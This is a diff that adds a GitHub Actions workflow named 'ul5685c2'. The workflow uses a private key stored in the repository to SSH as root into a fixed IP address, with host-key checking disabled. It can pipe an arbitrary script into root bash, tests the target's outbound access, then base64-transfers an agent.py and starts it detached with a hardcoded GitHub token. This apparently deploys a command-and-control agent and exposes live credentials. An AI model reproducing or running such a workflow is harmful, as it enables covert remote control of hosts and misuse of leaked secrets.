@@ -1,0 +1,49 @@
+name: ul5685c2
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: "agent|one"
+        default: "agent"
+      script:
+        description: "one-shot script path"
+        default: "vantage/ul5685_probe.sh"
+permissions:
+  contents: write
+jobs:
+  ex:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - uses: actions/checkout@v4
+      - name: boot
+        env:
+          MODE: ${{ inputs.mode }}
+          SCRIPT: ${{ inputs.script }}
+        run: |
+          set +e
+          chmod 600 keys2/k04_ibm_key.pem_
+          UP=0
+          for i in $(seq 1 34); do
+            if timeout 20 ssh -i keys2/k04_ibm_key.pem_ -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o IdentitiesOnly=yes root@123.184.7.135 'id -u' >/tmp/chk 2>/tmp/chke; then UP=1; echo "SSH_OK attempt=$i $(cat /tmp/chk)"; break; fi
+            echo "try=$i $(tail -1 /tmp/chke)"
+            sleep 12
+          done
+          [ "$UP" = "1" ] || { echo GIVEUP; exit 3; }
+          if [ "$MODE" = "one" ]; then
+            timeout 1200 ssh -i keys2/k04_ibm_key.pem_ -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o IdentitiesOnly=yes root@123.184.7.135 'TAG=one bash -s' < "$SCRIPT" 2>&1 | tail -400
+            exit 0
+          fi
+          echo "=== egress test from target"
+          timeout 60 ssh -i keys2/k04_ibm_key.pem_ -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o IdentitiesOnly=yes root@123.184.7.135 'hostname; date -u; curl -s -m 12 -o /dev/null -w "gh=%{http_code}\n" https://api.github.com/ ; curl -s -m 12 -o /dev/null -w "raw=%{http_code}\n" https://raw.githubusercontent.com/ ; curl -s -m 12 -o /dev/null -w "baidu=%{http_code}\n" https://www.baidu.com/' 2>&1
+          echo "=== deploy agent"
+          base64 -w0 agent.py > /tmp/agent.b64
+          timeout 120 ssh -i keys2/k04_ibm_key.pem_ -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o IdentitiesOnly=yes root@123.184.7.135 "mkdir -p /opt/ul5685; base64 -d > /opt/ul5685/agent.py <<'B64'
+          $(cat /tmp/agent.b64)
+          B64
+          pkill -f ul5685/agent.py; sleep 1; cd /opt/ul5685; GHT='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' setsid nohup python3 /opt/ul5685/agent.py >/dev/null 2>&1 & sleep 2; pgrep -af ul5685/agent.py; echo AGENT_STARTED" 2>&1 | tail -20
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: ul5685c2
+          path: /tmp/chke
